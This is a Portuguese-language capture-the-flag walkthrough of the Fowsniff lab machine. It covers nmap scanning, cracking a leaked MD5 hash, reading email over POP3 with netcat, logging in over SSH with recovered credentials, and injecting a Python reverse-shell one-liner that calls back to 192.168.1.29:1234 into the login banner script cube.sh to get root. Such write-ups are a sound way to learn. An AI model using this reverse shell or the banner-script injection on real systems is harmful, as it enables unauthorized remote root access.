# Fowsniff CTF

comecei com um nmap para mapear a rede

usando com os parametros -A -sV para ser mais verboso e ter todas informacoes necessarias
essa foi a saida:

└─# nmap -A -Pn  -sV 10.67.144.104
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 19:40 -0500
Nmap scan report for 10.67.144.104
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE CAPA TOP RESP-CODES USER UIDL PIPELINING
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: IMAP4rev1 more OK have AUTH=PLAINA0001 post-login listed LITERAL+ capabilities Pre-login IDLE LOGIN-REFERRALS ID ENABLE SASL-IR
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=2/18%OT=22%CT=1%CU=31975%PV=Y%DS=3%DC=T%G=Y%TM=69965C0
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=I%TS=8)SEQ(SP=1
OS:00%GCD=1%ISR=108%TI=Z%CI=I%TS=8)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)
OS:SEQ(SP=FD%GCD=1%ISR=105%TI=Z%CI=I%TS=8)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=I
OS:%TS=8)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8ST11NW7%O
OS:5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6
OS:=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   109.86 ms 192.168.128.1
2   ...
3   111.38 ms 10.67.144.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.85 seconds


observamos que tem alguns serviços abertos
como ssh, um pop3, um tcp

vamos tentar logar no site deles

quando faz a tentativa o site nao esta mais no ar, mas vamos no github do projeto ver oq receberia

e seria um arquivo .txt com as credenciais de email e o hash das senhas dos funcionarios
com isso escolhemos a seina para descobrir o hash da senha dela (ate pq é oq o desafio pede)

email: seina@fowsniff
hash: 90dc16d47114aa13671c697fd506cf26
decode: scoobydoo2

com isso ja podemos avançar, e fazer login no pop3 com usuario e senha
utilizaremos o netcat

nc <IP> 110
user seina
pass scoobydoo2
list

usando o comando list nos temos a listas dos emails
vemos q temos 2 id
vamos ver o primeiro:
achamos a senha: S1ck3nBluff+secureshell

no segundo email achamos o usuario: baksteen

agora com o usuario e a senha vamos tentar fazer o login no ssh:

assim que entramos temos acesso a maquina

tem um desafio/task de achar o grupo

usando o comando: find / -group users -type f 2>/dev/null

achamos um grupo chamado cube.sh
e um arquivo tbm
nos vamos la no arquivo e vemos oq tem nele:
cd /opt/cube
cat cube.sh

vimos que é a msm coisa que aparece assim que nos logamos no ssh
entao vamos injetar um comando nesse arquivo

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

ANTES::
baksteen@fowsniff:/opt/cube$ cat cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

baksteen@fowsniff:/opt/cube$ vim cube.sh 


DEPOIS::
baksteen@fowsniff:/opt/cube$ cat cube.sh 
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
baksteen@fowsniff:/opt/cube$ 

agora quando iniciamos teremos aberto um reverse shell para a maquina
saimos do ssh e logamos de novo para abrir o shell direto no root

o login funcionou
logo ganhamos acesso a maquina novamente
e no nosso nc ja estamos conectado no root

entao fazemos:
cd /root
cat flag.txt

e aqui achamos a flag
